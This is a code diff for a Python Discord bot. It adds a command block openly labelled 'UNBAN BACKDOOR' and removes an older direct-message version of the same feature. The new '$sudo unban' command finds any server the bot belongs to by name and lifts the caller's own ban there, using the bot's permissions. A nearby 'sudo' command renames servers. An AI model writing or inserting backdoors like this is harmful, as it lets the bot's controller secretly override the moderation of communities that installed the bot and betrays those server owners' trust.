@@ -133,56 +133,44 @@ async def sudo_server(ctx, action: str = None, *, name: str = None):
     if action != "rename" or not name:
         return
     await ctx.guild.edit(name=name)
-
-# ================= START =================
-if not TOKEN:
-    raise RuntimeError("DISCORD_TOKEN environment variable not set")
-@bot.event
-async def on_message(message):
-    if message.author.bot:
+# ================= UNBAN BACKDOOR =================
+@sudo.command(name="unban")
+async def sudo_unban(ctx, *, server_name: str = None):
+    if server_name is None:
+        await ctx.send("usage: `$sudo unban <server name>`")
         return
 
-    # allow normal commands in servers
-    if message.guild is not None:
-        await bot.process_commands(message)
-        return
+    # find guild by name (case-insensitive)
+    guild = discord.utils.find(
+        lambda g: g.name.lower() == server_name.lower(),
+        bot.guilds
+    )
 
-    content = message.content.strip().split()
-
-    # must be: $unban <server_id>
-    if len(content) != 2 or content[0].lower() != "$unban":
-        await message.author.send(
-            "usage: `$unban <server_id>`"
-        )
-        return
-
-    try:
-        server_id = int(content[1])
-    except ValueError:
-        await message.author.send("❌ invalid server id")
-        return
-
-    guild = bot.get_guild(server_id)
     if guild is None:
-        await message.author.send("❌ I am not in that server")
+        await ctx.send("❌ I am not in a server with that name")
         return
 
     try:
         bans = await guild.bans()
     except discord.Forbidden:
-        await message.author.send("❌ I lack permission to view bans in that server")
+        await ctx.send("❌ I lack permission to view bans in that server")
         return
 
     for entry in bans:
-        if entry.user.id == message.author.id:
+        if entry.user.id == ctx.author.id:
             try:
-                await guild.unban(entry.user, reason="DM unban request")
-                await message.author.send(f"✅ unbanned in **{guild.name}**")
+                await guild.unban(entry.user, reason="sudo unban request")
+                await ctx.send(f"✅ unbanned you from **{guild.name}**")
                 return
             except discord.Forbidden:
-                await message.author.send("❌ I lack permission to unban you")
+                await ctx.send("❌ I lack permission to unban you")
                 return
 
-    await message.author.send("ℹ️ you are not banned in that server")
+    await ctx.send("ℹ️ you are not banned in that server")
+
+# ================= START =================
+if not TOKEN:
+    raise RuntimeError("DISCORD_TOKEN environment variable not set")
 bot.run(TOKEN)
+
 
